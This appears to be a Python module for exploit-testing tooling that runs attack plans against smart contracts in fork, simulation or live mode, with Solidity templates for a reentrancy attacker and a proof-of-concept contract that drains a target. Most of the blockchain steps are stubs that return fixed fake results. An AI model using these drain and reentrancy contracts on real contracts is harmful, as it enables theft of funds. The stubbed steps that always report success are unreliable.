"""
Advanced Execution Engine for Exploit Testing

This module implements sophisticated execution capabilities:
- Fork-based execution for safe testing
- State simulation and tracking
- Transaction crafting and sequencing
- Proof of concept generation
"""

import asyncio
import json
import logging
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import hashlib

logger = logging.getLogger(__name__)


class ExecutionMode(Enum):
    """Execution modes for exploit testing"""
    FORK = "fork"              # Execute on forked chain
    SIMULATION = "simulation"  # Pure simulation without blockchain
    HYBRID = "hybrid"          # Combination of fork and simulation
    LIVE = "live"              # Live execution (dangerous!)


@dataclass
class ExecutionResult:
    """Result of exploit execution"""
    success: bool
    exploit_id: str
    execution_mode: ExecutionMode
    timestamp: datetime = field(default_factory=datetime.now)
    
    # Execution details
    steps_executed: List[Dict[str, Any]] = field(default_factory=list)
    state_changes: Dict[str, Any] = field(default_factory=dict)
    gas_used: int = 0
    
    # Attack results
    funds_extracted: float = 0.0
    contracts_affected: List[str] = field(default_factory=list)
    
    # Evidence
    transaction_hashes: List[str] = field(default_factory=list)
    execution_trace: List[Dict[str, Any]] = field(default_factory=list)
    revert_reasons: List[str] = field(default_factory=list)
    
    # Metadata
    vulnerability_type: Optional[str] = None
    target_contract: Optional[str] = None
    target_function: Optional[str] = None
    attack_vector: Optional[str] = None
    preconditions: List[str] = field(default_factory=list)
    
    # Additional data
    logs: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class Transaction:
    """Represents a blockchain transaction"""
    from_address: str
    to_address: str
    value: int = 0
    data: str = "0x"
    gas_limit: int = 3000000
    gas_price: int = 20000000000
    nonce: Optional[int] = None


class ExecutionEngine:
    """
    Advanced execution engine for exploit testing
    
    Safely executes exploits in controlled environments:
    - Forked blockchain execution
    - State simulation and rollback
    - Transaction sequencing
    - PoC generation
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """Initialize the execution engine"""
        self.config = config or {}
        self.mode = ExecutionMode(self.config.get('mode', 'fork'))
        self.timeout = self.config.get('timeout', 300)
        self.gas_limit = self.config.get('gas_limit', 30000000)
        self.enable_state_diff = self.config.get('enable_state_diff', True)
        
        # Fork management
        self.fork_url = self.config.get('fork_url')
        self.fork_block = self.config.get('fork_block', 'latest')
        
        # Simulation state
        self.simulation_state = {}
        self.transaction_queue = []
        
        # Execution history
        self.execution_history = []
        
        logger.info(f"Execution Engine initialized in {self.mode} mode")
    
    async def execute(
        self,
        plan: Dict[str, Any],
        analysis_results: Dict[str, Any],
        mode: Optional[str] = None
    ) -> ExecutionResult:
        """Execute an attack plan"""
        execution_mode = ExecutionMode(mode) if mode else self.mode
        logger.info(f"Executing plan in {execution_mode} mode")
        
        result = ExecutionResult(
            success=False,
            exploit_id=plan.get('id', 'unknown'),
            execution_mode=execution_mode
        )
        
        try:
            # Setup execution environment
            env = await self._setup_environment(execution_mode, analysis_results)
            
            # Execute attack steps
            for step in plan.get('steps', []):
                step_result = await self._execute_step(
                    step,
                    env,
                    result,
                    execution_mode
                )
                
                result.steps_executed.append(step_result)
                
                if not step_result.get('success'):
                    logger.warning(f"Step {step.get('id')} failed")
                    if step_result.get('critical'):
                        break
            
            # Check success conditions
            result.success = await self._check_success_conditions(
                result,
                plan,
                analysis_results
            )
            
            # Calculate extracted funds
            if result.success:
                result.funds_extracted = await self._calculate_extracted_funds(
                    result,
                    env
                )
            
            # Collect execution trace
            if self.enable_state_diff:
                result.state_changes = await self._get_state_diff(env)
            
        except asyncio.TimeoutError:
            logger.error(f"Execution timeout after {self.timeout} seconds")
            result.errors.append(f"Timeout after {self.timeout}s")
        except Exception as e:
            logger.error(f"Execution error: {e}")
            result.errors.append(str(e))
        finally:
            # Cleanup environment
            await self._cleanup_environment(env)
        
        # Store execution history
        self.execution_history.append(result)
        
        return result
    
    async def _setup_environment(
        self,
        mode: ExecutionMode,
        analysis_results: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Setup execution environment based on mode"""
        env = {
            'mode': mode,
            'start_time': datetime.now(),
            'contracts': {},
            'accounts': {},
            'state': {}
        }
        
        if mode == ExecutionMode.FORK:
            env['fork'] = await self._create_fork()
            env['provider'] = await self._get_fork_provider(env['fork'])
        elif mode == ExecutionMode.SIMULATION:
            env['simulator'] = await self._create_simulator()
            env['state'] = self._initialize_simulation_state(analysis_results)
        elif mode == ExecutionMode.HYBRID:
            env['fork'] = await self._create_fork()
            env['simulator'] = await self._create_simulator()
        
        # Setup attacker accounts
        env['attacker'] = await self._create_attacker_account(env)
        
        # Deploy necessary contracts
        if analysis_results.get('requires_attacker_contract'):
            env['attacker_contract'] = await self._deploy_attacker_contract(env)
        
        return env
    
    async def _execute_step(
        self,
        step: Dict[str, Any],
        env: Dict[str, Any],
        result: ExecutionResult,
        mode: ExecutionMode
    ) -> Dict[str, Any]:
        """Execute a single attack step"""
        step_result = {
            'step_id': step.get('id'),
            'action': step.get('action'),
            'success': False,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            action = step.get('action', '')
            
            # Route to appropriate execution method
            if action == 'deploy_attacker_contract':
                step_result.update(await self._deploy_contract(step, env))
            elif action == 'trigger_vulnerable_function':
                step_result.update(await self._call_function(step, env))
            elif action == 'request_flash_loan':
                step_result.update(await self._request_flash_loan(step, env))
            elif action == 'manipulate_price':
                step_result.update(await self._manipulate_price(step, env))
            elif action == 'drain_funds':
                step_result.update(await self._drain_funds(step, env))
            elif action == 'reenter_target':
                step_result.update(await self._reenter(step, env))
            else:
                # Generic transaction execution
                step_result.update(await self._execute_transaction(step, env))
            
            step_result['success'] = True
            
        except Exception as e:
            step_result['error'] = str(e)
            step_result['success'] = False
            logger.error(f"Step execution failed: {e}")
        
        return step_result
    
    async def _deploy_contract(
        self,
        step: Dict[str, Any],
        env: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Deploy an attacker contract"""
        logger.info("Deploying attacker contract")
        
        # Generate contract code based on vulnerability type
        contract_code = self._generate_attacker_contract(step)
        
        # Compile contract
        compiled = await self._compile_contract(contract_code)
        
        # Deploy to fork/simulation
        if env['mode'] == ExecutionMode.FORK:
            tx_hash, address = await self._deploy_to_fork(
                compiled,
                env['provider'],
                env['attacker']
            )
            return {
                'contract_address': address,
                'transaction_hash': tx_hash,
                'gas_used': compiled.get('gas_estimate', 0)
            }
        else:
            # Simulation deployment
            address = self._generate_address()
            env['contracts'][address] = {
                'code': compiled['bytecode'],
                'abi': compiled['abi']
            }
            return {'contract_address': address}
    
    async def _call_function(
        self,
        step: Dict[str, Any],
        env: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Call a contract function"""
        target = step.get('target')
        function = step.get('parameters', {}).get('function')
        args = step.get('parameters', {}).get('args', [])
        
        logger.info(f"Calling {target}.{function}")
        
        if env['mode'] == ExecutionMode.FORK:
            # Execute on fork
            tx_hash = await self._send_transaction_to_fork(
                env['provider'],
                target,
                function,
                args,
                env['attacker']
            )
            return {'transaction_hash': tx_hash}
        else:
            # Simulate function call
            result = self._simulate_function_call(
                env['state'],
                target,
                function,
                args
            )
            return {'simulation_result': result}
    
    async def _request_flash_loan(
        self,
        step: Dict[str, Any],
        env: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Request a flash loan"""
        amount = step.get('parameters', {}).get('amount', 0)
        provider = step.get('parameters', {}).get('provider', 'aave')
        
        logger.info(f"Requesting flash loan of {amount} from {provider}")
        
        # Build flash loan transaction
        if provider == 'aave':
            tx_data = self._build_aave_flash_loan(amount, env['attacker_contract'])
        elif provider == 'uniswap':
            tx_data = self._build_uniswap_flash_loan(amount, env['attacker_contract'])
        else:
            tx_data = {}
        
        # Execute flash loan
        if env['mode'] == ExecutionMode.FORK:
            tx_hash = await self._send_raw_transaction(env['provider'], tx_data)
            return {'transaction_hash': tx_hash, 'amount': amount}
        else:
            return {'simulated': True, 'amount': amount}
    
    async def _manipulate_price(
        self,
        step: Dict[str, Any],
        env: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Manipulate price oracle or AMM"""
        target = step.get('parameters', {}).get('target')
        manipulation_type = step.get('parameters', {}).get('type', 'swap')
        
        logger.info(f"Manipulating price on {target}")
        
        if manipulation_type == 'swap':
            # Large swap to move price
            return await self._execute_large_swap(target, env)
        elif manipulation_type == 'oracle':
            # Direct oracle manipulation
            return await self._manipulate_oracle(target, env)
        else:
            return {'error': 'Unknown manipulation type'}
    
    async def _drain_funds(
        self,
        step: Dict[str, Any],
        env: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Drain funds from vulnerable contract"""
        target = step.get('target')
        method = step.get('parameters', {}).get('method', 'withdraw')
        
        logger.info(f"Draining funds from {target}")
        
        # Get current balance
        initial_balance = await self._get_balance(target, env)
        
        # Execute drain
        if method == 'withdraw':
            tx_result = await self._call_withdraw(target, env)
        elif method == 'transfer':
            tx_result = await self._force_transfer(target, env)
        else:
            tx_result = {}
        
        # Get final balance
        final_balance = await self._get_balance(target, env)
        
        return {
            'drained_amount': initial_balance - final_balance,
            'transaction': tx_result
        }
    
    async def _reenter(
        self,
        step: Dict[str, Any],
        env: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute reentrancy attack"""
        target = step.get('target')
        
        logger.info(f"Reentering {target}")
        
        # Setup reentrancy in attacker contract
        if 'attacker_contract' in env:
            await self._setup_reentrancy_callback(
                env['attacker_contract'],
                target,
                env
            )
        
        # Trigger reentrancy
        return await self._trigger_reentrancy(target, env)
    
    async def _execute_transaction(
        self,
        step: Dict[str, Any],
        env: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Execute generic transaction"""
        tx = Transaction(
            from_address=env['attacker']['address'],
            to_address=step.get('target', '0x0'),
            value=step.get('parameters', {}).get('value', 0),
            data=step.get('parameters', {}).get('data', '0x'),
            gas_limit=self.gas_limit
        )
        
        if env['mode'] == ExecutionMode.FORK:
            tx_hash = await self._send_transaction(env['provider'], tx)
            return {'transaction_hash': tx_hash}
        else:
            return self._simulate_transaction(env['state'], tx)
    
    async def _check_success_conditions(
        self,
        result: ExecutionResult,
        plan: Dict[str, Any],
        analysis_results: Dict[str, Any]
    ) -> bool:
        """Check if exploit was successful"""
        # Check if all critical steps succeeded
        critical_steps = [s for s in result.steps_executed if s.get('critical')]
        if critical_steps and not all(s.get('success') for s in critical_steps):
            return False
        
        # Check if funds were extracted
        if result.funds_extracted > 0:
            return True
        
        # Check if state was modified as expected
        if result.state_changes:
            expected_changes = plan.get('expected_state_changes', {})
            if self._verify_state_changes(result.state_changes, expected_changes):
                return True
        
        # Check custom success conditions
        success_conditions = plan.get('success_conditions', [])
        for condition in success_conditions:
            if not self._evaluate_condition(condition, result):
                return False
        
        return len(result.steps_executed) > 0 and not result.errors
    
    async def _calculate_extracted_funds(
        self,
        result: ExecutionResult,
        env: Dict[str, Any]
    ) -> float:
        """Calculate total funds extracted"""
        total = 0.0
        
        # Sum up all transfers to attacker
        for step_result in result.steps_executed:
            if 'drained_amount' in step_result:
                total += step_result['drained_amount']
        
        # Check final attacker balance
        if 'attacker' in env:
            attacker_balance = await self._get_balance(
                env['attacker']['address'],
                env
            )
            total = max(total, attacker_balance)
        
        return total
    
    async def _get_state_diff(self, env: Dict[str, Any]) -> Dict[str, Any]:
        """Get state difference after execution"""
        if env['mode'] == ExecutionMode.FORK:
            # Get state diff from fork
            return await self._get_fork_state_diff(env['fork'])
        else:
            # Return simulation state changes
            return env.get('state', {})
    
    async def _cleanup_environment(self, env: Dict[str, Any]):
        """Cleanup execution environment"""
        if 'fork' in env:
            await self._destroy_fork(env['fork'])
        if 'simulator' in env:
            self._reset_simulator(env['simulator'])
    
    async def generate_poc(self, exploit: Any) -> str:
        """Generate proof of concept code for exploit"""
        logger.info(f"Generating PoC for exploit {exploit.id}")
        
        poc_template = """
// Proof of Concept for {vulnerability_type}
// Target: {target_contract}
// Severity: {severity}
// Discovered: {timestamp}

pragma solidity ^0.8.0;

interface ITarget {{
    {target_interface}
}}

contract ExploitPoC {{
    ITarget public target;
    address public owner;
    
    constructor(address _target) {{
        target = ITarget(_target);
        owner = msg.sender;
    }}
    
    function exploit() external {{
        require(msg.sender == owner, "Only owner");
        
        // Attack sequence
        {attack_sequence}
    }}
    
    function withdraw() external {{
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }}
    
    {additional_functions}
    
    receive() external payable {{
        {receive_logic}
    }}
}}
"""
        
        # Fill in template
        poc = poc_template.format(
            vulnerability_type=exploit.vulnerability_type,
            target_contract=exploit.target_contract or "Unknown",
            severity=exploit.severity,
            timestamp=exploit.discovery_timestamp.isoformat(),
            target_interface=self._generate_interface(exploit),
            attack_sequence=self._generate_attack_sequence(exploit),
            additional_functions=self._generate_additional_functions(exploit),
            receive_logic=self._generate_receive_logic(exploit)
        )
        
        return poc
    
    # Helper methods for environment setup
    async def _create_fork(self) -> Dict[str, Any]:
        """Create blockchain fork for testing"""
        # This would integrate with actual forking service
        return {'id': 'fork_' + self._generate_id(), 'block': self.fork_block}
    
    async def _get_fork_provider(self, fork: Dict[str, Any]) -> Any:
        """Get provider for fork"""
        # Return web3 or ethers provider
        return {'fork_id': fork['id']}
    
    async def _create_simulator(self) -> Dict[str, Any]:
        """Create simulation environment"""
        return {'id': 'sim_' + self._generate_id()}
    
    def _initialize_simulation_state(
        self,
        analysis_results: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Initialize simulation state from analysis"""
        return {
            'contracts': analysis_results.get('contracts', {}),
            'balances': {},
            'storage': {}
        }
    
    async def _create_attacker_account(self, env: Dict[str, Any]) -> Dict[str, Any]:
        """Create attacker account with funds"""
        return {
            'address': '0x' + 'a' * 40,
            'private_key': '0x' + 'b' * 64,
            'balance': 10 ** 18  # 1 ETH
        }
    
    async def _deploy_attacker_contract(self, env: Dict[str, Any]) -> str:
        """Deploy attacker contract"""
        # Deploy pre-compiled attacker contract
        return '0x' + 'c' * 40
    
    # Helper methods for contract generation
    def _generate_attacker_contract(self, step: Dict[str, Any]) -> str:
        """Generate attacker contract code"""
        vuln_type = step.get('parameters', {}).get('vulnerability', {})
        
        if vuln_type == 'reentrancy':
            return self._generate_reentrancy_contract()
        elif vuln_type == 'flash_loan':
            return self._generate_flash_loan_contract()
        else:
            return self._generate_generic_attacker_contract()
    
    def _generate_reentrancy_contract(self) -> str:
        """Generate reentrancy attacker contract"""
        return """
pragma solidity ^0.8.0;

contract ReentrancyAttacker {
    address public target;
    uint256 public attackCount;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() external payable {
        // Initial call to vulnerable function
        (bool success,) = target.call{value: msg.value}("");
        require(success, "Attack failed");
    }
    
    receive() external payable {
        if (attackCount < 10) {
            attackCount++;
            // Reenter vulnerable function
            (bool success,) = target.call{value: 0}("");
        }
    }
}
"""
    
    def _generate_flash_loan_contract(self) -> str:
        """Generate flash loan attacker contract"""
        return """
pragma solidity ^0.8.0;

contract FlashLoanAttacker {
    function executeFlashLoan(uint256 amount) external {
        // Flash loan logic
    }
}
"""
    
    def _generate_generic_attacker_contract(self) -> str:
        """Generate generic attacker contract"""
        return """
pragma solidity ^0.8.0;

contract GenericAttacker {
    function attack(address target) external {
        // Attack logic
    }
}
"""
    
    async def _compile_contract(self, code: str) -> Dict[str, Any]:
        """Compile contract code"""
        # This would use actual Solidity compiler
        return {
            'bytecode': '0x' + 'd' * 100,
            'abi': [],
            'gas_estimate': 1000000
        }
    
    # Utility methods
    def _generate_id(self) -> str:
        """Generate unique ID"""
        return hashlib.sha256(str(datetime.now()).encode()).hexdigest()[:8]
    
    def _generate_address(self) -> str:
        """Generate contract address"""
        return '0x' + hashlib.sha256(str(datetime.now()).encode()).hexdigest()[:40]
    
    def _verify_state_changes(
        self,
        actual: Dict[str, Any],
        expected: Dict[str, Any]
    ) -> bool:
        """Verify state changes match expectations"""
        for key, value in expected.items():
            if key not in actual or actual[key] != value:
                return False
        return True
    
    def _evaluate_condition(
        self,
        condition: Dict[str, Any],
        result: ExecutionResult
    ) -> bool:
        """Evaluate success condition"""
        # Simple condition evaluation
        return True
    
    # PoC generation helpers
    def _generate_interface(self, exploit: Any) -> str:
        """Generate target interface for PoC"""
        return "function vulnerableFunction() external payable;"
    
    def _generate_attack_sequence(self, exploit: Any) -> str:
        """Generate attack sequence for PoC"""
        steps = []
        for step in exploit.steps:
            steps.append(f"// Step: {step.get('action', 'Unknown')}")
            steps.append("target.vulnerableFunction();")
        return "\n        ".join(steps)
    
    def _generate_additional_functions(self, exploit: Any) -> str:
        """Generate additional functions for PoC"""
        if exploit.vulnerability_type == "reentrancy":
            return """
    function onTokenReceived() external {
        // Reentrancy callback
        if (address(target).balance > 0) {
            target.vulnerableFunction();
        }
    }"""
        return ""
    
    def _generate_receive_logic(self, exploit: Any) -> str:
        """Generate receive function logic for PoC"""
        if exploit.vulnerability_type == "reentrancy":
            return """
        if (address(target).balance > 0) {
            target.vulnerableFunction();
        }"""
        return "// Receive funds"
    
    # Placeholder methods for actual blockchain interaction
    async def _deploy_to_fork(self, compiled: Dict, provider: Any, account: Dict) -> Tuple[str, str]:
        """Deploy contract to fork"""
        tx_hash = '0x' + 'e' * 64
        address = '0x' + 'f' * 40
        return tx_hash, address
    
    async def _send_transaction_to_fork(
        self,
        provider: Any,
        target: str,
        function: str,
        args: List,
        account: Dict
    ) -> str:
        """Send transaction to fork"""
        return '0x' + '1' * 64
    
    async def _send_raw_transaction(self, provider: Any, tx_data: Dict) -> str:
        """Send raw transaction"""
        return '0x' + '2' * 64
    
    async def _send_transaction(self, provider: Any, tx: Transaction) -> str:
        """Send transaction"""
        return '0x' + '3' * 64
    
    def _simulate_function_call(
        self,
        state: Dict,
        target: str,
        function: str,
        args: List
    ) -> Dict[str, Any]:
        """Simulate function call"""
        return {'success': True, 'return_value': None}
    
    def _simulate_transaction(self, state: Dict, tx: Transaction) -> Dict[str, Any]:
        """Simulate transaction"""
        return {'success': True, 'gas_used': 21000}
    
    def _build_aave_flash_loan(self, amount: int, receiver: str) -> Dict[str, Any]:
        """Build Aave flash loan transaction"""
        return {'to': '0xaave', 'data': '0x', 'value': 0}
    
    def _build_uniswap_flash_loan(self, amount: int, receiver: str) -> Dict[str, Any]:
        """Build Uniswap flash loan transaction"""
        return {'to': '0xuniswap', 'data': '0x', 'value': 0}
    
    async def _execute_large_swap(self, target: str, env: Dict) -> Dict[str, Any]:
        """Execute large swap to move price"""
        return {'swap_executed': True, 'price_impact': 0.1}
    
    async def _manipulate_oracle(self, target: str, env: Dict) -> Dict[str, Any]:
        """Manipulate price oracle"""
        return {'oracle_manipulated': True, 'new_price': 1000}
    
    async def _get_balance(self, address: str, env: Dict) -> float:
        """Get account balance"""
        return env.get('state', {}).get('balances', {}).get(address, 0)
    
    async def _call_withdraw(self, target: str, env: Dict) -> Dict[str, Any]:
        """Call withdraw function"""
        return {'withdrawn': True, 'amount': 1000}
    
    async def _force_transfer(self, target: str, env: Dict) -> Dict[str, Any]:
        """Force transfer from contract"""
        return {'transferred': True, 'amount': 1000}
    
    async def _setup_reentrancy_callback(
        self,
        attacker_contract: str,
        target: str,
        env: Dict
    ):
        """Setup reentrancy callback in attacker contract"""
        pass
    
    async def _trigger_reentrancy(self, target: str, env: Dict) -> Dict[str, Any]:
        """Trigger reentrancy attack"""
        return {'reentered': True, 'depth': 3}
    
    async def _get_fork_state_diff(self, fork: Dict) -> Dict[str, Any]:
        """Get state diff from fork"""
        return {'storage_changes': {}, 'balance_changes': {}}
    
    async def _destroy_fork(self, fork: Dict):
        """Destroy blockchain fork"""
        pass
    
    def _reset_simulator(self, simulator: Dict):
        """Reset simulator state"""
        pass